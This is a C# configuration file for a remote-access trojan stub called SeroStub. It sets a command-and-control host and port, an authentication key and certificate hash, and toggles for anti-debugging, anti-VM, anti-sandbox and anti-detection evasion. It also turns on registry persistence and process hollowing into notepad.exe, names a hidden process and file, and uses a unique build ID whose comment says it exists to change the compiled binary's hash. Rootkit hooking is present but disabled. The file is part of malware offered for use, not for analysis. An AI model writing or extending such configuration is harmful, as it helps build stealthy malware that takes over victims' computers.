namespace SeroStub;

internal static class Config
{
    public static readonly string[] Hosts = new[] { "127.0.0.1" };
    public const int Port = 7777;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}";

    public const bool AntiDebug = true;
    public const bool AntiVM = true;
    public const bool AntiDetect = true;
    public const bool AntiSandbox = true;

    public const bool PersistRegistry = true;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const string PersistName = "aahah";

    public const bool AntiKill = false;
    public const bool EnableWatchdog = false;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "notepad.exe";

    public const string AuthKey = "tWMi3vNzAmgj0cqlzeEq9of00pe+fjR7";
    public const string CertHash = "BC278821D4E260D147200DBDBE6204B2C080AF7B8D36C99E7612DD515363E953";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "00106ec6c33444edb5200a26aaab8ef1";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = "BBB";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = "aahah";
    public const string HiddenFileName = "aahah.exe";

    public const bool EnableRootkit = false;
    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();
}
